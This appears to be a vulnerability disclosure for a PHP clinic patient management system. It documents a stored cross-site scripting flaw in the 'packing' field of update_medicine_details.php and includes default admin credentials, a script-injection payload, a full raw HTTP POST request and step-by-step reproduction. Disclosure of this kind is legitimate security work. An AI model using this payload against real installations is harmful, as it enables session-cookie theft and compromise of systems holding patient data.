# Clinic's Patient Management System v1.0 by oretnom23 has xss vulnerability

Author：ZhangZhaoYue

The password for the backend login account is: admin/admin123

Vulnerability details: There is a stored xss vulnerability in "update_medicine_details.php" of the Medicine Detaits module of the Medicines module in the background management system

vendors: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

Vulnerability File: pms/update_medicine_details.php

Vulnerability location: ip/pms/update_medicine_details.php?medicine_id=1&medicine_detail_id=1&packing=,packing

[+] Payload: ip/pms/update_medicine_details.php?medicine_id=1&medicine_detail_id=1&packing=<script>alert(/document.cookie/)</script> // Leak place ---> packing


```sql
POST /pms/update_medicine_details.php?medicine_id=1&medicine_detail_id=1&packing=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/pms/update_medicine_details.php?medicine_id=1&medicine_detail_id=1&packing=%3Cscript%3Ealert(document.cookie)%3C/script%3E
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=0e9b9jpdjupmvl1dk6lq6dnmfe
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

hidden_id=1&medicine=1&packing=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&submit=
```

1. After we log in to the background, click on Medicines, then click on Medicines Details

![image](https://user-images.githubusercontent.com/48553402/176654143-135d24cf-48a5-4648-ac04-8b1948894f35.png)

2. Pull to the bottom to see the editing function, click the edit on the first line

![image](https://user-images.githubusercontent.com/48553402/176654221-c89f136f-3938-4f7f-ab1e-57bbf6cdc990.png)

3. Fill in our payload in the packing box (<script>alert(document.cookie)</script>),Click update to save

![image](https://user-images.githubusercontent.com/48553402/176654454-de82f23e-e359-47c4-ba32-bb5383674722.png)

4.After clicking save, you can see that our payload is executed, and the cookie pops up

![image](https://user-images.githubusercontent.com/48553402/176654845-76c713a7-8b67-4d04-a511-ddef173a00ea.png)

5.And also execute our payload when we access the Medicine Detaits of the Medicines module

![image](https://user-images.githubusercontent.com/48553402/176655025-1158c1f4-3beb-45a4-a3c2-52d7e97ec6af.png)
